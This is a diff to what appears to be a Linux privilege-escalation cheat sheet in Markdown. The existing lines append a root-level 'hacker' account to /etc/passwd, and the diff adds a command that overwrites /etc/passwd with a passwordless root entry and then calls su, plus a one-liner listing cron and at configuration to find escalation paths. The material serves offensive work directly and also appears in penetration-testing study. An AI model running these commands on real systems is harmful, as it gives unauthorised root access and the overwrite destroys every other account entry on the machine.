@@ -69,6 +69,12 @@ perl -le ‘print crypt(“Password@973″,”addedsalt”)’
 echo "hacker:<our_generated_password>:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
 ```
 
+OR reset root pasword using this trick (may be unstable):
+
+```
+echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su
+```
+
 Can we add user with no password to /etc/sudoers file?
 
 ```
@@ -108,4 +114,10 @@ Check what exported path are availble:
 
 ```
 export -p
+```
+
+Check background process (cronjobs):
+
+```
+crontab -l; ls -alh /var/spool/cron; ls -al /etc/ | grep cron; ls -al /etc/cron*; cat /etc/cron*; cat /etc/at.allow; cat /etc/at.deny; cat /etc/cron.allow; cat /etc/cron.deny
 ```
